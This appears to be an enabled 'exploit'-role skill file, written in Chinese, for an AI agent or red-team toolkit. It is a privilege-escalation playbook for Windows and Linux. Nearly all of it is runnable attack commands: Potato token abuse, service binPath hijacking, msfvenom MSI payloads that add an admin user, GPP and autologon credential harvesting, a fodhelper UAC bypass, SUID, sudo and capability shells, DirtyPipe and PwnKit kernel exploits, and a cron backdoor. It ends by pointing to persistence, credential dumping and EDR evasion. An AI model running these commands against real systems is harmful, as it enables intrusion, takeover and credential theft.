---
name: privesc-workshop
description: 权限提升专题：Windows UAC bypass 全家桶、Potato 系（SeImpersonate）、服务路径劫持、Unattended/GPP 凭据残留、Linux SUID/capabilities/sudo 误配/内核漏洞
whenToUse: 拿到低权限 shell（www-data/普通用户）需要提到 SYSTEM/root；需要本地提权后才能继续横向或dump凭据
role: exploit
enabled: true
---

# 权限提升（Windows / Linux）

低权限落地后第一件事。**判定红线:whoami 为 SYSTEM/root**(不是"exploit 跑完没报错")。

## 一、Windows 提权

### 0. 快速信息收集
```powershell
whoami /priv                          # 特权(重点看 SeImpersonate/SeAssignPrimaryToken)
whoami /groups
systeminfo | findstr /i "hotfix os"   # 补丁情况
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```
辅助:winPEAS.exe / Sherlock / Watson(补丁差距比对)

### 1. Potato 系(有 SeImpersonate = Web 服务账户必走)
```powershell
# Win10/11 + Server2019+:RoguePotato / GodPotato(需要 SeImpersonate)
GodPotato -cmd "whoami"
# JuicyPotato(Win10 1809 前)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\ProgramData\pwn.txt" -t * -c {CLSID}
# PrintSpoofer(Server2016-2019 常用)
PrintSpoofer.exe -i -c "cmd /c whoami"
```

### 2. 服务路径/配置
```powershell
# 未引号服务路径(空格目录)
wmic service get name,pathname,startmode | findstr /i "Program"
# 可写服务二进制目录 → 覆盖/放同名 exe → 重启服务
# 服务权限弱(SC_MANAGER_ALL_ACCESS)→ 直接改 binPath
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
sc config <svc> binPath= "C:\ProgramData\x.exe" & sc stop <svc> & sc start <svc>
```

### 3. AlwaysInstallElevated(MSI 提权)
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 两个键都=1 时:
msfvenom -p windows/x64/exec CMD='net localgroup administrators <user> /add' -f msi > p.msi
msiexec /quiet /qn /i C:\ProgramData\p.msi
```

### 4. 凭据残留(无需漏洞)
```powershell
# Unattended 安装文件
dir /s C:\Windows\Panther\*.xml
# GPP cpassword(组策略密码,cpassword 可解)
findstr /s /i cpassword \\<DC>\SYSVOL\*.xml
gpp-decrypt <cpassword>
# 注册表自动登录
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

### 5. UAC Bypass(已在管理员组,只差提权令牌)
```powershell
# fodhelper(Win10 常用)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd /c start x.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /d {} /f
fodhelper.exe
# computerdefaults / eventvewr 同理换 progid
```

## 二、Linux 提权

### 0. 信息收集
```bash
id; sudo -l; uname -a
find / -perm -4000 -type f 2>/dev/null          # SUID
getcap -r / 2>/dev/null                          # capabilities
ls -la /etc/cron*; cat /etc/crontab
```
辅助:linPEAS.sh / linEnum.sh / pspy(看实时 cron)

### 1. SUID 经典位
```bash
# 查 GTFOBins:sudo/vim/find/env/bash/sed/awk/python/perl...
sudo install -m =xs $(which bash) /tmp/x && /tmp/x -p
find . -exec /bin/sh -p \;             # find SUID
vim -c ':!sh'                            # vim SUID
```

### 2. sudo 误配
```bash
sudo -l
# (ALL) NOPASSWD: 任意程序 → 直接跑
# sudo < 1.8.28:user ALL=(ALL, !root) → sudo -u#-1
# sudo < 1.9.5p2:env_keep 注入 sudoedit → sudoedit -s '"'"'x' /etc/passwd
```

### 3. capabilities
```bash
getcap -r / 2>/dev/null
# cap_setuid+ep 的 python/perl/ruby → 脚本内 os.setuid(0)
python3 -c 'import os;os.setuid(0);os.system("/bin/sh -p")'
```

### 4. 内核漏洞(最后手段)
```bash
uname -r
# DirtyPipe(CVE-2022-0847, 5.8<=k<5.16.11):覆写只读文件
./dirtypipe /usr/bin/su 1 'root::0:0::/root:/bin/sh' && su
# DirtyCow(CVE-2016-5195)/ PwnKit(CVE-2021-4034 polkit):pkexec
./cve-2021-4034
# io_uring(CVE-2023-1829)/OverlayFS(CVE-2023-0386)按内核选
```

### 5. 计划任务/PATH
```bash
cat /etc/crontab; ls -la /etc/cron.*/       # root 跑的可写脚本
echo 'cp /bin/bash /tmp/x && chmod +s /tmp/x' >> /usr/local/bin/maint.sh
# PATH 劫持:脚本调用的无路径命令 → 当前目录放同名恶意文件
```

## 红线(完成判定)
- Windows:`whoami` = nt authority\system
- Linux:`id -u` = 0
- 提权后第一时间拉稳定通道(c2-persistence)并 dump 凭据(credential-attack / ad-domain-attack)

## 衔接
- 提权前被拦 → evasion-defense-bypass(EDR)
- 提权后 → ad-domain-attack(域) / lateral-movement / c2-persistence
